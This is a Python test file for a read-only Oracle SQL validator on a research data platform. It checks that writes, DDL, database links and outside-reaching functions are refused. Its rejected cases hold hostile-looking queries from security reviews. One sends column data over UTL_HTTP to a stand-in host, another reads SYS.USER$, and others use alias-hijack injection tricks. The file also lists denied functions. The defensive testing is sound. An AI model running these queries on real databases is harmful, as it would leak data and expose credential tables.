import pytest

from datalab.data.sqlcheck import ORACLE_FUNCTIONS, SqlRejected, TableRef, check_sql

from .sql_samples import SAMPLE_CALLS

COHORTS = frozenset({"IHS_2024", "IHS_2025", "IHS_2026"})


def ok(sql: str):
    # Column resolution has its own tests below (TestColumns).
    return check_sql(sql, allowed_schemas=COHORTS, columns=None)


def rejected(sql: str) -> str:
    with pytest.raises(SqlRejected) as info:
        ok(sql)
    return str(info.value)


class TestAllowed:
    def test_simple_select_reports_tables_and_binds(self):
        result = ok(
            "SELECT STUDY_PARTICIPANT_ID, TRACKERSTEPS FROM IHS_2025.VFITBITDAILYDATA "
            "WHERE RECORD_DATE >= TO_DATE(:start_date, 'YYYY-MM-DD')"
        )
        assert result.tables == (TableRef("IHS_2025", "VFITBITDAILYDATA"),)
        assert result.binds == ("start_date",)
        assert result.warnings == ()

    def test_cte_names_are_not_tables(self):
        result = ok("WITH d AS (SELECT a FROM IHS_2025.T) SELECT COUNT(*) FROM d")
        assert result.tables == (TableRef("IHS_2025", "T"),)

    def test_union_across_cohorts(self):
        result = ok("SELECT a FROM IHS_2024.T UNION ALL SELECT a FROM ihs_2025.t")
        assert result.schemas == {"IHS_2024", "IHS_2025"}

    def test_subquery_tables_are_found(self):
        result = ok("SELECT * FROM IHS_2025.A WHERE id IN (SELECT id FROM IHS_2026.B)")
        assert {str(t) for t in result.tables} == {"IHS_2025.A", "IHS_2026.B"}

    def test_trailing_semicolon_and_comments(self):
        assert ok("SELECT a /* note */ FROM IHS_2025.T -- end\n;").tables

    def test_semicolon_inside_string_is_not_a_second_statement(self):
        assert ok("SELECT 'a;b' AS x FROM dual").tables == ()

    def test_common_oracle_functions(self):
        ok(
            "SELECT TRUNC(RECORD_DATE), NVL(a, 0), DECODE(a, 1, 'x'), TO_CHAR(b, 'YYYY'), "
            "ROW_NUMBER() OVER (PARTITION BY id ORDER BY d), FROM_TZ(CAST(t AS TIMESTAMP), 'UTC') "
            "FROM IHS_2025.T FETCH FIRST 10 ROWS ONLY"
        )

    def test_select_star_warns(self):
        assert "SELECT *" in ok("SELECT * FROM IHS_2025.T").warnings[0]


class TestRejected:
    @pytest.mark.parametrize(
        "sql",
        [
            "DELETE FROM IHS_2026.T",
            "UPDATE IHS_2026.T SET a = 1",
            "INSERT INTO IHS_2026.T VALUES (1)",
            "ALTER TABLE IHS_2026.T ADD (x NUMBER)",
            "DROP TABLE IHS_2026.T",
            "CREATE TABLE x AS SELECT * FROM IHS_2025.T",
            "MERGE INTO IHS_2026.T t USING IHS_2025.S s ON (t.id = s.id) "
            "WHEN MATCHED THEN UPDATE SET t.a = s.a",
            "TRUNCATE TABLE IHS_2026.T",
            "GRANT SELECT ON IHS_2025.T TO PUBLIC",
        ],
    )
    def test_writes_and_ddl(self, sql):
        rejected(sql)

    def test_multiple_statements(self):
        assert "one statement" in rejected("SELECT 1 FROM dual; DELETE FROM IHS_2026.T")

    def test_plsql_block(self):
        rejected("BEGIN NULL; END;")

    def test_plsql_function_in_with(self):
        rejected("WITH FUNCTION f RETURN NUMBER IS BEGIN RETURN 1; END; SELECT f FROM dual")

    def test_for_update(self):
        rejected("SELECT a FROM IHS_2025.T FOR UPDATE")

    def test_select_into(self):
        rejected("SELECT a INTO b FROM IHS_2025.T")

    def test_database_link(self):
        assert "Database links" in rejected("SELECT * FROM IHS_2025.T@remote_db")

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT UTL_HTTP.REQUEST('http://example.org/?x=' || a) FROM IHS_2025.T",
            "SELECT SYS.DBMS_PIPE.SEND_MESSAGE('x') FROM dual",
            "SELECT HTTPURITYPE('http://example.org').getclob() FROM dual",
        ],
    )
    def test_calls_that_could_reach_outside_the_database(self, sql):
        rejected(sql)

    def test_unknown_function(self):
        message = rejected("SELECT MY_CUSTOM_FN(a) FROM IHS_2025.T")
        assert "isn't one of Oracle's built-in SQL functions" in message

    def test_xml_query_functions(self):
        rejected("SELECT * FROM XMLTABLE('/a' PASSING XMLTYPE('<a/>'))")

    def test_sequences(self):
        rejected("SELECT my_seq.NEXTVAL FROM dual")

    def test_unqualified_table(self):
        assert "Qualify" in rejected("SELECT * FROM all_tables")

    def test_schema_not_allowed(self):
        assert "SYS" in rejected("SELECT * FROM SYS.USER$")

    def test_empty(self):
        rejected("   ;  ")

    def test_too_long(self):
        rejected("SELECT a FROM IHS_2025.T WHERE a IN (" + ",".join(["1"] * 40000) + ")")

    def test_unparseable(self):
        assert "parsed" in rejected("SELEC a FORM t")


class TestCteScope:
    """An unqualified name is only a CTE if a WITH clause around it defines it."""

    def test_cte_chain_is_allowed(self):
        result = ok(
            "WITH a AS (SELECT id FROM IHS_2025.T), b AS (SELECT id FROM a) SELECT * FROM b"
        )
        assert result.tables == (TableRef("IHS_2025", "T"),)

    def test_cte_in_subquery_and_union(self):
        ok("SELECT * FROM (WITH a AS (SELECT 1 x FROM dual) SELECT x FROM a)")
        ok("WITH a AS (SELECT 1 x FROM dual) SELECT x FROM a UNION ALL SELECT x FROM a")

    def test_nested_cte_does_not_hide_an_outer_reference(self):
        assert "Qualify" in rejected(
            "SELECT * FROM (WITH all_users AS (SELECT 1 x FROM dual) "
            "SELECT x FROM all_users) a, all_users"
        )

    def test_a_cte_body_cannot_use_a_later_cte_name(self):
        # Oracle resolves `b` in the first CTE as a real object, not the later CTE.
        assert "Qualify" in rejected(
            "WITH a AS (SELECT * FROM b), b AS (SELECT 1 x FROM dual) SELECT * FROM a"
        )

    def test_sibling_subquery_ctes_are_not_visible(self):
        assert "Qualify" in rejected(
            "SELECT * FROM (WITH s AS (SELECT 1 x FROM dual) SELECT x FROM s) p, "
            "(SELECT x FROM s) q"
        )


class TestFunctions:
    """Oracle's built-in SQL functions are allowed; anything else, and the few
    built-ins that can reach outside the database, are not."""

    def test_every_allowed_function_has_a_sample_call(self):
        assert set(SAMPLE_CALLS) == ORACLE_FUNCTIONS

    @pytest.mark.parametrize("name", sorted(SAMPLE_CALLS))
    def test_allowed_function(self, name):
        ok(f"SELECT {SAMPLE_CALLS[name]} FROM IHS_2025.T")

    @pytest.mark.parametrize(
        "call",
        [
            "SYS_CONTEXT('USERENV', 'IP_ADDRESS')",
            "USERENV('TERMINAL')",
            'XMLELEMENT("a", x)',  # sqlglot models this one
            "XMLAGG(x)",
            "XMLTYPE(s)",
            "EXTRACTVALUE(s, '/a')",
            "BFILENAME('DIR', 'f.txt')",
            "DUMP(x)",
            "SYS_XMLGEN(x)",
        ],
    )
    def test_denied_function(self, call):
        assert "isn't allowed" in rejected(f"SELECT {call} FROM IHS_2025.T")


class TestCallsAsWritten:
    """From the security review: the parser maps some names onto its own
    functions, but Oracle runs the name as written."""

    @pytest.mark.parametrize(
        "call",
        ["MD5('a')", "LEFT('a', 1)", "IFNULL(a, 1)", "SHA2('a', 256)", "DATE_ADD(d, 1)", "YEAR(d)"],
    )
    def test_names_that_arent_oracle_built_ins(self, call):
        assert "isn't one of Oracle's built-in" in rejected(f"SELECT {call} FROM IHS_2025.T")

    def test_quoted_names_must_match_exactly(self):
        message = rejected('SELECT "nvl"(a, 1) FROM IHS_2025.T')
        assert "without quotes" in message
        ok('SELECT "NVL"(a, 1) FROM IHS_2025.T')

    @pytest.mark.parametrize(
        "sql",
        [
            "WITH q (a, b) AS (SELECT 1, 2 FROM DUAL) SELECT a FROM q",
            "SELECT CAST(a AS NUMBER(10, 2)), CAST(b AS VARCHAR2(20)) FROM IHS_2025.T",
            "SELECT INTERVAL '5' DAY(3) TO SECOND(2) FROM DUAL",
            "SELECT COUNT(DISTINCT(a)) FROM IHS_2025.T WHERE a IN (1, 2)",
            "SELECT a FROM IHS_2025.T WHERE EXISTS (SELECT 1 FROM DUAL)",
            "SELECT a FROM IHS_2025.T GROUP BY ROLLUP (a)",
            # Clauses the tokenizer reads as one token, followed by "(".
            "SELECT a FROM IHS_2025.T ORDER BY (a + 1)",
            "SELECT a FROM IHS_2025.T GROUP BY (a)",
            "SELECT ROW_NUMBER() OVER (PARTITION BY (a) ORDER BY (b)) FROM IHS_2025.T",
            "SELECT LEVEL FROM DUAL START WITH (1 = 1) CONNECT BY (LEVEL <= 3)",
            "SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 3 ORDER SIBLINGS BY (LEVEL)",
        ],
    )
    def test_sql_words_that_take_parentheses(self, sql):
        ok(sql)

    def test_a_type_name_only_counts_after_as(self):
        assert "isn't one of Oracle's built-in" in rejected("SELECT NUMBER(5) FROM IHS_2025.T")


# A small catalog: T has a quoted lowercase column, as the real survey views do.
CATALOG = {
    "IHS_2025": {
        "T": {"A": "NUMBER", "B": "VARCHAR2", "D": "DATE", "interest0": "NUMBER"},
        "U": {"A": "NUMBER", "C": "DATE"},
    }
}


def ok_with_catalog(sql: str):
    return check_sql(sql, allowed_schemas=COHORTS, columns=CATALOG)


def rejected_with_catalog(sql: str) -> str:
    with pytest.raises(SqlRejected) as info:
        ok_with_catalog(sql)
    return str(info.value)


class TestColumns:
    """Oracle runs a name that isn't a column as a call with no arguments, so
    every column must be a real column of a table in its scope."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT ORA_DATABASE_NAME FROM DUAL",
            "SELECT ORA_LOGIN_USER FROM DUAL",
            "SELECT DBMS_UTILITY.PORT_STRING FROM DUAL",
            "SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL",
            "SELECT UTL_HTTP.REQUEST FROM DUAL",
            "SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP IS NULL",
            "SELECT DATALAB_RO.DL_NOPAREN FROM DUAL",
            "SELECT secret_fn FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.T UNION SELECT secret_fn FROM DUAL",
            "SELECT (SELECT secret_fn FROM DUAL) FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.NOT_IN_CATALOG",
            "SELECT interest0 FROM IHS_2025.T",  # Oracle reads this as INTEREST0
            # Names qualify takes for an alias defined elsewhere; Oracle would run
            # them as functions (confirmed with decoys on the synthetic database).
            "WITH q (evil) AS (SELECT 1 FROM DUAL) "
            "SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'HIJACKED'",
            "SELECT 'x' AS evil FROM DUAL WHERE 1 = 0 "
            "UNION ALL SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'x'",
            "SELECT 1 AS evil FROM DUAL WHERE evil IS NULL",
        ],
    )
    def test_names_that_arent_columns(self, sql):
        rejected_with_catalog(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT a, b FROM IHS_2025.T WHERE ROWNUM <= 5",
            'SELECT "interest0" FROM IHS_2025.T',
            "SELECT t.a, u.c FROM IHS_2025.T t JOIN IHS_2025.U u ON u.a = t.a",
            "SELECT LEVEL, SYSDATE, USER, SYSTIMESTAMP FROM DUAL CONNECT BY LEVEL <= 3",
            "SELECT d.dummy FROM DUAL d",
            "WITH x AS (SELECT a AS n FROM IHS_2025.T) SELECT n FROM x ORDER BY n",
            "SELECT a AS z, COUNT(*) AS k FROM IHS_2025.T GROUP BY a ORDER BY z",
            "SELECT a FROM IHS_2025.T WHERE EXISTS (SELECT 1 FROM IHS_2025.U WHERE c = d)",
            "SELECT s.a FROM (SELECT a FROM IHS_2025.T) s",
            "SELECT * FROM IHS_2025.T",
            "SELECT a FROM IHS_2025.T WHERE d >= :start_date",
            "SELECT a, ROW_NUMBER() OVER (PARTITION BY b ORDER BY d) AS rn FROM IHS_2025.T",
            "WITH q (n) AS (SELECT a FROM IHS_2025.T) SELECT n FROM q ORDER BY n",
            "SELECT a AS z FROM IHS_2025.T ORDER BY z + 1",
            "SELECT a FROM IHS_2025.T t "
            "WHERE a = (SELECT MAX(u.a) FROM IHS_2025.U u WHERE u.c = t.d)",
        ],
    )
    def test_real_columns_and_pseudo_columns(self, sql):
        ok_with_catalog(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 1 FROM DUAL FETCH FIRST EVILE ROWS ONLY",
            "SELECT 1 FROM DUAL FETCH FIRST DBMS_RANDOM.VALUE ROWS ONLY",
            "SELECT 1 FROM DUAL OFFSET ORA_DATABASE_NAME ROWS",
        ],
    )
    def test_row_counts_must_be_numbers_or_binds(self, sql):
        assert "FETCH and OFFSET" in rejected_with_catalog(sql)

    def test_row_counts(self):
        ok_with_catalog("SELECT a FROM IHS_2025.T OFFSET 5 ROWS FETCH NEXT :n ROWS ONLY")
        ok_with_catalog("SELECT a FROM IHS_2025.T FETCH FIRST 10 ROWS ONLY")

    def test_with_an_empty_catalog_nothing_runs(self):
        with pytest.raises(SqlRejected):
            check_sql("SELECT a FROM IHS_2025.T", allowed_schemas=COHORTS, columns={})


class TestSecondReview:
    """From the second security review."""

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT ORA_DATABASE_NAME, DBMS_UTILITY.PORT_STRING FROM (SELECT 1 x FROM DUAL)"
            " PIVOT (COUNT(*) FOR x IN (1 AS a))",
            "SELECT ORA_LOGIN_USER FROM (SELECT 1 x FROM DUAL) UNPIVOT (v FOR k IN (x))",
        ],
    )
    def test_pivot_is_refused(self, sql):
        assert "PIVOT and UNPIVOT aren't supported" in rejected_with_catalog(sql)

    def test_an_alias_in_having(self):
        sql = "SELECT a AS evil, COUNT(*) FROM IHS_2025.T GROUP BY a HAVING evil IS NULL"
        assert "HAVING can't use the name" in rejected_with_catalog(sql)
        ok_with_catalog("SELECT a AS n, COUNT(*) FROM IHS_2025.T GROUP BY a HAVING COUNT(*) > 1")

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT 'x' AS evil FROM DUAL WHERE 1=0 UNION ALL"
            " SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'HIJACKED'",
            "SELECT 'y' FROM DUAL GROUP BY dummy HAVING ORA_DATABASE_NAME = 'FREEPDB1'"
            " UNION ALL SELECT 'x' AS ORA_DATABASE_NAME FROM DUAL WHERE 1=0",
            "SELECT * FROM (SELECT 'x' AS evil FROM DUAL UNION ALL"
            " SELECT 'y' FROM DUAL GROUP BY dummy HAVING evil = 'x')",
        ],
    )
    def test_an_alias_from_another_branch_in_having(self, sql):
        assert "HAVING can't use the name" in rejected_with_catalog(sql)

    def test_q_quoted_strings_are_refused_cleanly(self):
        rejected_with_catalog("SELECT q'[ ' ]' FROM DUAL")

    def test_grouping_sets(self):
        sql = "SELECT a, b, COUNT(*) FROM IHS_2025.T GROUP BY GROUPING SETS ((a), (b), ())"
        ok_with_catalog(sql)

    def test_recursive_with_needs_qualified_columns(self):
        recursive = (
            "WITH r (n) AS (SELECT 1 FROM DUAL UNION ALL SELECT {n} + 1 FROM r WHERE {n} < 3)"
        )
        assert "qualify its columns" in rejected_with_catalog(
            recursive.format(n="n") + " SELECT n FROM r"
        )
        ok_with_catalog(recursive.format(n="r.n") + " SELECT n FROM r")
